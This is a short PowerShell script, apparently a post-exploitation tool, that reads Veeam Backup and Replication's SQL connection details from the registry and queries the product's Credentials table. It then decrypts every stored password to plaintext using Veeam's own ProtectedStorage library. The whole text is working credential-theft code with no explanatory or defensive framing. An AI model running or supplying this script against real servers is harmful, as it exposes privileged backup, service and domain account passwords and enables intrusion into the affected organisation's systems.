$instance = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication" -name SqlInstanceName).SqlInstanceName
$server = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication" -name SqlServerName).SqlServerName
$result = Invoke-Sqlcmd -Query "SELECT TOP (1000) [user_name],[password],[description] FROM [VeeamBackup].[dbo].[Credentials]" -ServerInstance "$server\$instance"
Add-Type -Path "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Common.dll"
$result | ForEach-Object { [Veeam.Backup.Common.ProtectedStorage]::GetLocalString($($_.password))}
